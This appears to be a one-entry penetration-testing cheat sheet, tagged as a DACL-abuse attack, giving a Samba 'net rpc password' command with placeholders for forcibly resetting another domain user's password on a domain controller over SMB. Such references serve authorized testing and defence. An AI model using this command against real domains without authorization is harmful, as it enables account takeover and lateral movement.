# samba

## change user password
#plateform/linux #target/remote  #port/445 #protocol/smb #cat/ATTACK/DACL-ABUSE 
```
net rpc password '<target_user>' '<new_password>' -U '<domain_netbios>'/'<user>'%'<password>' -S "<dc>"
```